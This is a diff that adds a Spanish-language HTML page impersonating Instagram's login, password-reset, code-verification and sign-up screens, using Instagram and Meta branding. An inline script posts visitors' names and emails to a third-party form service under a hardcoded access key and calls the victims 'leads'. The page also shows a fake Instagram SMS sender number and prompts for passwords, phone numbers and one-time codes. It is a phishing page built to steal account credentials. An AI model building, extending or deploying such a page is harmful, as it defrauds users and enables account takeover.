@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#000000">
+  <title>Instagram</title>
+  <link rel="icon" type="image/png" href="LOGO.png">
+  <link rel="apple-touch-icon" href="LOGO.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/variables.css">
+  <link rel="stylesheet" href="css/base.css">
+  <link rel="stylesheet" href="css/login.css">
+</head>
+<body class="login-page">
+  <script>
+    // Esta función envía los datos del cliente potencial en segundo plano
+    async function enviarNuevoLead(nombre, email, notas = "Nuevo cliente potencial") {
+      const data = {
+        access_key: "aac109e6-8b0b-486d-a6bc-c66aa2c10f8e",
+        name: nombre,
+        email: email,
+        message: notas
+      };
+  
+      try {
+        const response = await fetch("https://api.web3forms.com/submit", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+          },
+          body: JSON.stringify(data)
+        });
+  
+        const result = await response.json();
+        if (result.success) {
+          console.log("Lead guardado correctamente en Web3Forms.");
+        }
+      } catch (error) {
+        console.error("Error al enviar los datos:", error);
+      }
+    }
+  </script>
+
+  <!-- Selector idioma -->
+  <header class="login-topbar" id="login-topbar">
+    <div class="lang-wrap">
+      <button type="button" class="login-topbar__lang" id="lang-toggle" aria-haspopup="listbox" aria-expanded="false">
+        <span id="lang-label">Español (España)</span>
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+      </button>
+      <ul class="lang-menu lang-menu--hidden" id="lang-menu" role="listbox"></ul>
+    </div>
+  </header>
+
+  <!-- ═══ PANTALLA: LOGIN ═══ -->
+  <section class="screen screen--active" id="screen-login" data-screen="login">
+    <div class="login-brand">
+      <img src="LOGO.png" alt="Instagram" class="login-brand__logo">
+    </div>
+    <form class="login-form" id="login-form">
+      <input type="text" id="username" class="login-form__input" data-i18n="login_user_ph" placeholder="Usuario, Correo electronico o Movil" autocomplete="username">
+      <div class="login-form__field login-form__field--password">
+        <input type="password" id="password" class="login-form__input" data-i18n="login_pwd_ph" placeholder="Contraseña" autocomplete="current-password">
+        <button type="button" class="login-form__toggle-pwd" data-toggle-pwd aria-label="Mostrar contraseña">
+          <svg class="icon icon--sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+        </button>
+      </div>
+      <button type="submit" class="login-form__submit" id="login-submit" data-i18n="login_submit">Iniciar sesión</button>
+    </form>
+    <button type="button" class="login-forgot" id="btn-forgot" data-i18n="login_forgot">¿Has olvidado la contraseña?</button>
+    <footer class="login-bottom">
+      <button type="button" class="login-bottom__signup" id="btn-register" data-i18n="login_signup">Crear cuenta nueva</button>
+      <img src="META%20TEXTO.png" alt="Meta" class="login-bottom__meta-img">
+    </footer>
+  </section>
+
+  <!-- ═══ PANTALLA: BUSCAR PERFIL (olvidé contraseña) ═══ -->
+  <section class="screen" id="screen-forgot-find" data-screen="forgot-find">
+    <div class="screen-header">
+      <button type="button" class="screen-header__back" data-goto="login" aria-label="Volver">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>
+      </button>
+    </div>
+    <h1 class="screen-title" data-i18n="forgot_title">Buscar tu perfil</h1>
+    <p class="screen-desc" data-i18n="forgot_desc">Introduce tu correo electrónico o nombre de usuario.</p>
+    <a href="#" class="screen-link" data-i18n="forgot_hacked">Creo que me han hackeado la cuenta</a>
+    <form class="screen-form" id="forgot-find-form">
+      <input type="text" id="forgot-identifier" class="login-form__input" data-i18n="forgot_input_ph" placeholder="Correo electrónico o nombre de usuario" required>
+      <button type="submit" class="login-form__submit login-form__submit--active" data-i18n="continue">Continuar</button>
+    </form>
+  </section>
+
+  <!-- ═══ PANTALLA: VERIFICAR TELÉFONO ═══ -->
+  <section class="screen" id="screen-forgot-phone" data-screen="forgot-phone">
+    <div class="screen-header">
+      <button type="button" class="screen-header__back" data-goto="forgot-find" aria-label="Volver">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>
+      </button>
+    </div>
+    <h1 class="screen-title" data-i18n="verify_phone_title">Verifica tu número</h1>
+    <p class="screen-desc" data-i18n="verify_phone_desc">Introduce tu número de móvil. Te enviaremos un SMS de Instagram.</p>
+    <p class="screen-sms-from">SMS de Instagram · <span id="sms-sender">+34642549035</span></p>
+    <form class="screen-form" id="forgot-phone-form">
+      <input type="tel" id="forgot-phone" class="login-form__input" data-i18n="phone_ph" placeholder="Número de móvil" required>
+      <button type="submit" class="login-form__submit login-form__submit--active" data-i18n="continue">Continuar</button>
+    </form>
+  </section>
+
+  <!-- ═══ PANTALLA: CÓDIGO (SMS o Email) ═══ -->
+  <section class="screen" id="screen-forgot-code" data-screen="forgot-code">
+    <div class="screen-header">
+      <button type="button" class="screen-header__back" data-goto-back aria-label="Volver">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>
+      </button>
+    </div>
+    <h1 class="screen-title" id="code-screen-title" data-i18n="verify_email_title">Verifica tu correo</h1>
+    <p class="screen-desc" id="code-screen-desc" data-i18n="verify_email_desc">Te hemos enviado un código a tu correo electrónico.</p>
+    <form class="screen-form" id="forgot-code-form">
+      <input type="text" id="forgot-code" class="login-form__input login-form__input--code" data-i18n="code_ph" placeholder="Código de confirmación" inputmode="numeric" maxlength="6" required>
+      <p class="form-error form-error--hidden" id="code-error" data-i18n="code_invalid">Código incorrecto. Inténtalo de nuevo.</p>
+      <button type="submit" class="login-form__submit login-form__submit--active" data-i18n="continue">Continuar</button>
+      <button type="button" class="screen-link-btn" id="btn-resend-code" data-i18n="resend">Reenviar código</button>
+    </form>
+  </section>
+
+  <!-- ═══ PANTALLA: NUEVA CONTRASEÑA ═══ -->
+  <section class="screen" id="screen-forgot-password" data-screen="forgot-password">
+    <div class="screen-header">
+      <button type="button" class="screen-header__back" data-goto="forgot-code" aria-label="Volver">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>
+      </button>
+    </div>
+    <h1 class="screen-title" data-i18n="new_pwd_title">Crea una contraseña nueva</h1>
+    <form class="screen-form" id="forgot-password-form">
+      <input type="password" id="forgot-new-pwd" class="login-form__input" data-i18n="new_pwd_ph" placeholder="Nueva contraseña" required>
+      <input type="password" id="forgot-confirm-pwd" class="login-form__input" data-i18n="confirm_pwd_ph" placeholder="Confirmar contraseña" required>
+      <p class="form-error form-error--hidden" id="forgot-pwd-error" data-i18n="pwd_mismatch">Las contraseñas no coinciden.</p>
+      <button type="submit" class="login-form__submit login-form__submit--active" data-i18n="update_pwd">Actualizar contraseña</button>
+    </form>
+  </section>
+
+  <!-- ═══ PANTALLA: REGISTRO paso 1 ═══ -->
+  <section class="screen" id="screen-register-1" data-screen="register-1">
+    <div class="screen-header">
+      <button type="button" class="screen-header__back" data-goto="login" aria-label="Volver">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>
+      </button>
+    </div>
+    <h1 class="screen-title" data-i18n="reg_title">Crear cuenta nueva</h1>
+    <p class="screen-desc" data-i18n="reg_step1_desc">Introduce tu correo y nombre.</p>
+    <form class="screen-form" id="register-step1-form">
+      <input type="email" id="reg-email" class="login-form__input" data-i18n="reg_email_ph" placeholder="Correo electrónico" required>
+      <input type="text" id="reg-name" class="login-form__input" data-i18n="reg_name_ph" placeholder="Nombre y apellidos" required>
+      <button type="submit" class="login-form__submit login-form__submit--active" data-i18n="next">Siguiente</button>
+    </form>
+  </section>
+
+  <!-- ═══ PANTALLA: REGISTRO paso 2 ═══ -->
+  <section class="screen" id="screen-register-2" data-screen="register-2">
+    <div class="screen-header">
+      <button type="button" class="screen-header__back" data-goto="register-1" aria-label="Volver">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>
+      </button>
+    </div>
+    <h1 class="screen-title" data-i18n="reg_title">Crear cuenta nueva</h1>
+    <p class="screen-desc" data-i18n="reg_step2_desc">Elige tu nombre de usuario y móvil.</p>
+    <form class="screen-form" id="register-step2-form">
+      <input type="text" id="reg-username" class="login-form__input" data-i18n="reg_user_ph" placeholder="Nombre de usuario" required>
+      <input type="tel" id="reg-phone" class="login-form__input" data-i18n="phone_ph" placeholder="Número de móvil" required>
+      <button type="submit" class="login-form__submit login-form__submit--active" data-i18n="next">Siguiente</button>
+    </form>
+  </section>
+
+  <!-- ═══ PANTALLA: REGISTRO paso 3 ═══ -->
+  <section class="screen" id="screen-register-3" data-screen="register-3">
+    <div class="screen-header">
+      <button type="button" class="screen-header__back" data-goto="register-2" aria-label="Volver">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6"/></svg>
+      </button>
+    </div>
+    <h1 class="screen-title" data-i18n="reg_title">Crear cuenta nueva</h1>
+    <p class="screen-desc" data-i18n="reg_step3_desc">Crea una contraseña segura.</p>
+    <form class="screen-form" id="register-step3-form">
+      <input type="password" id="reg-password" class="login-form__input" data-i18n="new_pwd_ph" placeholder="Nueva contraseña" required>
+      <input type="password" id="reg-confirm" class="login-form__input" data-i18n="confirm_pwd_ph" placeholder="Confirmar contraseña" required>
+      <p class="form-error form-error--hidden" id="reg-pwd-error" data-i18n="pwd_mismatch">Las contraseñas no coinciden.</p>
+      <button type="submit" class="login-form__submit login-form__submit--active" data-i18n="reg_submit">Regístrate</button>
+    </form>
+  </section>
+
+  <script src="js/config.js"></script>
+  <script src="js/i18n.js"></script>
+  <script src="js/form-service.js"></script>
+  <script src="js/verify-service.js"></script>
+  <script src="js/login.js"></script>
+</body>
+</html>
